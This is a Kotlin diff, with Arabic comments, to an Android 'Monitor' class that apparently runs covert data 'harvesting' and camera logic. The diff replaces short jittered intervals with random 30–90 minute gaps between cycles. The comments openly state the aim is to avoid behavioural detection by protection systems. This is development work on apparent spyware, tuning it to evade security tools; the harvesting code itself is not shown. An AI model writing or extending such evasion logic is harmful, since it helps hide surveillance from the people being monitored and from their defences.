@@ -33,6 +33,7 @@ import kotlin.random.Random
  * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  * ✅ تم توسيع نطاق تأخير بدء التشغيل إلى 15-60 ثانية.
  * ✅ تم زيادة الحد الأدنى للفاصل الزمني إلى 120 ثانية.
+ * ✅ تم توسيع النطاق الزمني بين دورات المراقبة إلى 30-90 دقيقة لتجنب الكشف السلوكي.
  */
 class Monitor private constructor(context: Context) {
 
@@ -444,7 +445,7 @@ class Monitor private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دورة الحياة مع Jitter محسن
+    //  ✅ دورة الحياة مع Jitter محسن + فترات متباعدة جداً
     // ============================================================
 
     fun start() {
@@ -491,7 +492,7 @@ class Monitor private constructor(context: Context) {
                 forceHarvest()
             }
 
-            // ✅ الحلقة الرئيسية مع Jitter محسن
+            // ✅ الحلقة الرئيسية مع Jitter محسن وفترات متباعدة جداً (30-90 دقيقة)
             while (isRunning && isActive) {
                 try {
                     // تنفيذ منطق الحصاد والكاميرا
@@ -501,25 +502,13 @@ class Monitor private constructor(context: Context) {
                     writeLog("Monitor loop error: ${e.message}")
                 }
 
-                // ✅ حساب الفاصل الزمني مع Jitter عشوائي (±25%)
-                val baseInterval = (configMap["iv"] as? Number)?.toLong() ?: 900L // بالثواني
-                val jitterPercent = (configMap["jitter_percent"] as? Number)?.toDouble() ?: 0.25
-                val maxJitterLimit = (configMap["max_jitter_limit"] as? Number)?.toLong() ?: 300L // بالثواني
-
-                // تطبيق الجيتر العشوائي
-                val jitterFactor = 1.0 + Random.nextDouble(-jitterPercent, jitterPercent)
-                var jitteredInterval = (baseInterval * jitterFactor).toLong()
-
-                // ✅ الحد الأدنى للفاصل الزمني (لا يقل عن 120 ثانية)
-                jitteredInterval = maxOf(120L, jitteredInterval)
-
-                // الحد الأقصى للجيتر (لا يزيد عن baseInterval + maxJitterLimit)
-                jitteredInterval = minOf(baseInterval + maxJitterLimit, jitteredInterval)
-
-                // تحويل إلى ملي ثانية
-                val finalDelay = jitteredInterval * 1000L
-
-                writeLog("⏱️ Next cycle in ${jitteredInterval}s (base: ${baseInterval}s, jitter: ${String.format("%.1f", (jitterFactor - 1.0) * 100)}%)")
+                // ✅ جيتر بشري متقدم: فترات متباعدة عشوائية تماماً (بين 30 و 90 دقيقة)
+                // لتجنب أي نمط زمني يمكن أن ترصده أنظمة الحماية
+                val baseMinutes = Random.nextInt(30, 91)
+                val jitterSeconds = Random.nextInt(0, 60)
+                val finalDelay = (baseMinutes * 60L + jitterSeconds) * 1000L
+                
+                writeLog("⏱️ Next cycle in ${(finalDelay / 60000)}m ${(finalDelay % 60000) / 1000}s")
                 delay(finalDelay)
             }
         }
